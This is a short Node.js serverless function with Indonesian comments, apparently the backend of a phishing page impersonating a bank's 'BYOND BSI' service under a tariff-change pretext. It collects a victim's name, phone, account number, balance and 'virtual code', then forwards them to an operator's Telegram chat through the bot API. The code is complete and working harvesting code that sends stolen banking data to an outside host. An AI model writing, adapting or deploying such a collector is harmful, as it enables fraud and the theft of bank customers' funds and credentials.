const axios = require('axios');

exports.handler = async (event, context) => {
    // CORS headers untuk semua response
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    // Handle preflight request
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers,
            body: ''
        };
    }

    // Validasi method
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        // Parse data
        const data = JSON.parse(event.body);
        console.log("Received data:", data); // Logging untuk debugging

        // Validasi field wajib
        const requiredFields = ['name', 'phone', 'accountNumber', 'balance', 'virtualCode', 'tariff'];
        const missingFields = requiredFields.filter(field => !data[field]);
        
        if (missingFields.length > 0) {
            throw new Error(`Field yang wajib diisi: ${missingFields.join(', ')}`);
        }

        // Validasi environment variables
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            throw new Error('Konfigurasi Telegram tidak lengkap');
        }

        // Format pesan
        const message = `
╭───────────────────────────
│  🔔 *BYOND BSI - DATA BARU*  
├───────────────────────────
│  *📌 DETAIL REKENING*  
├───────────────────────────
│  • *Nama*: ${data.name || '-'}
│  • *Nomor HP*: ${data.phone || '-'}
├───────────────────────────
│  • *Nomor Rekening*: ${data.accountNumber || '-'}
│  • *Saldo*: Rp ${data.balance.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") || '-'}
├───────────────────────────
│  • *Kode Virtual*: ${data.virtualCode || '-'}
│  • *Tarif Dipilih*: ${data.tariff === 'old' ? 'LAMA (Rp 6.500/transaksi)' : 'BARU (Rp 150.000/bulan)'}
╰───────────────────────────
        `;

        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(telegramUrl, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log("Telegram response:", response.data); // Logging response

        if (!response.data.ok) {
            throw new Error('Gagal mengirim ke Telegram');
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true,
                message: 'Data berhasil dikirim'
            })
        };

    } catch (error) {
        console.error("Error:", error); // Logging error
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: error.message,
                details: error.response?.data || null
            })
        };
    }
};
